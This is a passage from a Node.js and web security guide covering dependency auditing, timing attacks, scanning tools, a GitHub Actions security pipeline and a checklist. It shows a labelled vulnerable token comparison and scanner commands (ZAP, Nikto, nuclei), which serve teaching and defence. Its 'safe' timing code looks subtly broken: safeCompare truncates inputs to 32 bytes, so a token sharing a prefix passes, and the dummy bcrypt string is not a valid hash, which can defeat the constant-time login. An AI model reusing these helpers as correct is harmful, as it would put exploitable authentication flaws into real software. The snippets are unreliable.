```

---

## 17. npm & Environment Security

```bash
# Audit in CI/CD
npm audit --audit-level=critical
npx better-npm-audit audit

# Snyk — deep analysis
npx snyk test
npx snyk monitor

# SBOM — Software Bill of Materials
npx cyclonedx-npm --output-file sbom.json

# License compliance
npx license-checker --onlyAllow 'MIT;Apache-2.0;BSD-2-Clause;BSD-3-Clause'
```

```javascript
// Pin exact versions in package.json (avoid ^ and ~)
{
  "dependencies": {
    "express": "4.18.2",   // ✅ exact version
    "lodash": "^4.17.21"   // ⚠️ patch updates allowed
  }
}
```

---

## 18. Timing Attacks

```javascript
// Problem: different response times reveal whether data exists

// ❌ Vulnerable — shorter string returns faster
function checkToken(userToken, validToken) {
  return userToken === validToken;
}

// ✅ Node.js — built-in safe comparison
import crypto from 'crypto';

function safeCompare(a, b) {
  // Buffers must be the same length for timingSafeEqual
  const aBuffer = Buffer.alloc(32);
  const bBuffer = Buffer.alloc(32);
  Buffer.from(a).copy(aBuffer);
  Buffer.from(b).copy(bBuffer);
  return crypto.timingSafeEqual(aBuffer, bBuffer);
}

// For login — consistent timing for existing/non-existing users
async function login(email, password) {
  const user = await User.findOne({ email });

  // Always run bcrypt, even if the user is not found
  const dummyHash = '$2b$12$dummy.hash.to.prevent.timing.attack.padding';
  const hashToCheck = user?.passwordHash ?? dummyHash;

  const isValid = await bcrypt.compare(password, hashToCheck);

  if (!user || !isValid) {
    throw new Error('Invalid credentials'); // same message for both cases
  }

  return createSession(user);
}
```

---

## 19. Tools & Automation

### 19.1 Static Analysis

```bash
# ESLint with security plugins
npm install --save-dev eslint eslint-plugin-security eslint-plugin-no-unsanitized

# .eslintrc.json
{
  "plugins": ["security", "no-unsanitized"],
  "extends": ["plugin:security/recommended"],
  "rules": {
    "no-unsanitized/method": "error",
    "no-unsanitized/property": "error",
    "security/detect-eval-with-expression": "error",
    "security/detect-non-literal-regexp": "warn",
    "security/detect-object-injection": "warn",
    "security/detect-possible-timing-attacks": "error"
  }
}

# Semgrep — powerful SAST
npx semgrep --config=p/javascript --config=p/nodejs

# CodeQL (GitHub Actions)
# .github/workflows/codeql.yml
```

---

### 19.2 DAST & Testing

```bash
# OWASP ZAP — dynamic analysis
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://myapp.com -r zap-report.html

# Nikto — web scanner
nikto -h https://myapp.com

# nuclei — template-based scanner
nuclei -u https://myapp.com -t cves/ -t exposures/
```

---

### 19.3 GitHub Actions — Security Pipeline

```yaml
# .github/workflows/security.yml
name: Security Scan

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: npm audit
        run: npm audit --audit-level=high

      - name: Snyk vulnerability scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

      - name: Semgrep SAST
        uses: returntocorp/semgrep-action@v1
        with:
          config: p/javascript p/nodejs p/owasp-top-ten

      - name: Scan for secrets in code
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
```

---

## 20. Security Checklist

### XSS & Injection
- [ ] All user input escaped via `esc()` or `textContent`
- [ ] DOMPurify used for user-generated HTML content
- [ ] Trusted Types enabled in CSP
- [ ] No `innerHTML`, `eval`, or `document.write` with user data
- [ ] Parameterized queries used for all database access
- [ ] NoSQL operators validated and sanitized

### CSRF & Authentication
- [ ] CSRF tokens on all state-changing requests
- [ ] SameSite=Strict on session cookies
- [ ] JWT stored in memory; refresh token in httpOnly cookie
- [ ] Bcrypt/Argon2 for passwords (salt rounds ≥ 12)
- [ ] Rate limiting on /login and /register
- [ ] MFA implemented for sensitive operations

### Headers & Transport
- [ ] HTTPS enforced (HSTS enabled)
- [ ] Content Security Policy configured
- [ ] X-Frame-Options: DENY
- [ ] X-Content-Type-Options: nosniff
- [ ] Referrer-Policy configured
- [ ] Permissions-Policy restricts browser APIs

### Data & Storage
- [ ] Sensitive data not in localStorage
- [ ] Cookies: httpOnly + secure + sameSite
- [ ] Secrets in environment variables only
- [ ] .env in .gitignore
- [ ] Logs contain no passwords or tokens

### Dependencies
- [ ] `npm audit` runs in CI/CD
- [ ] Exact versions pinned or lockfile committed
- [ ] SRI attributes on all external scripts
- [ ] Dependencies updated on a regular schedule

### Code & Configuration
- [ ] ESLint with security plugins enabled
- [ ] No hardcoded secrets (trufflehog scan)
- [ ] Errors reveal no details in production
- [ ] Timing-safe comparison for token validation
- [ ] postMessage handlers verify origin

---

## Resources

| Resource | Description |
|----------|-------------|
| [OWASP Top 10](https://owasp.org/www-project-top-ten/) | Top vulnerability classes |
| [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/) | Application security verification standard |
| [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security) | Browser security documentation |
| [Node.js Security](https://nodejs.org/en/docs/guides/security) | Official Node.js guide |
| [snyk.io](https://snyk.io) | Vulnerability database |
| [cve.mitre.org](https://cve.mitre.org) | CVE database |

---

*This guide covers OWASP Top 10 (2021) and is current for Node.js 18+ and modern browsers.*
